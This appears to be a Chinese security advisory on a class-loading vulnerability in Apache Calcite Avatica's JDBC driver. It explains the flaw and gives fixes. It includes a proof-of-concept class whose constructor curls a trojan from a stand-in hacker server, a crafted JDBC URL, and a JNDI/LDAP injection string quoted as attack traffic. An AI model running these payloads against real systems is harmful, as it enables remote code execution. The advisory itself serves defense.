#  Apache Calcite惊现高危漏洞！数据库连接竟成黑客后门？   
云梦DC  云梦安全   2025-04-28 01:01  
  
一、漏洞原理揭秘  
  
核心杀伤力：  
```
// 致命代码片段
String className = config.httpClientClass();
Class<?> clazz = Class.forName(className);
Constructor<?> constructor = clazz.getConstructor(URL.class);
return (AvaticaHttpClient) constructor.newInstance(url);
攻击者通过伪造httpclient_impl参数，可：
```  
  
  
✅ 加载任意恶意类  
  
✅ 触发类构造函数执行任意代码  
  
✅ 绕过Java安全管理机制  
  
攻击三要素：  
  
控制JDBC连接字符串  
  
构造包含危险函数的恶意类  
  
目标类存在以URL为参数的构造函数  
  
二、攻击链深度解析  
  
▍ 漏洞环境搭建（Maven配置）  
```
<!-- 存在漏洞的版本 -->
<dependency>
    <groupId>org.apache.calcite.avatica</groupId>
    <artifactId>avatica</artifactId>
    <version>1.21.0</version> <!-- 危险版本 -->
</dependency>
```  
  
  
▍ 攻击代码演示  
```
// 恶意客户端构造
public class EvilClient {
    public EvilClient(URL url) throws Exception {
        Runtime.getRuntime().exec("curl http://黑客服务器/木马");
    }
}
// 触发漏洞
Properties props = new Properties();
props.setProperty("httpclient_impl", "EvilClient"); // 注入恶意类
Connection conn = DriverManager.getConnection("jdbc:avatica:...", props);
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndxZsFvkmpywWFGcowDD0H4TUjnA63KRwUXFgIibIbsBcZjHNPeAMeAeB2ovoOKvz15E1k3M4Eic3GdtE4ZIR2Ww/640?wx_fmt=png&from=appmsg "")  
  
  
▍ 高级利用技巧  
```
# 通过反射加载远程类
jdbc:avatica:remote:url=http://受害服务?httpclient_impl=javax.script.ScriptEngineManager
```  
  
  
三、企业级防御方案  
  
1. 热修复代码（临时方案）  
```
// 添加类安全校验
if (!AvaticaHttpClient.class.isAssignableFrom(clazz)) {
    throw new SecurityException("非法HTTP客户端类");
}
```  
  
2. WAF精准拦截规则  
  
```
location ~* jdbc:avatica {
    if ($args ~* "httpclient_impl=") {
        deny all; # 阻断异常参数
    }
}
3. 终
```  
  
极修复指南  
  
官方已发布安全补丁，立即升级至：  
```
# 查看当前版本
mvn dependency:tree | grep avatica
# 升级至安全版本
<version>1.22.0</version> <!-- 修复版本 -->
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndxZsFvkmpywWFGcowDD0H4TUjnA63KRIWUs2Rl5M0n6LVrN9ictSrbGFzvELPHibEaFuVO0vFW8JFdkQwnj3Nag/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞情报追踪  
  
监测发现攻击者正批量扫描4567端口，特征流量包括：  
```
POST /v1/statement HTTP/1.1
Content-Type: application/json
{"avaticaUser":"${jndi:ldap://恶意域名}"
```  
  
  
  
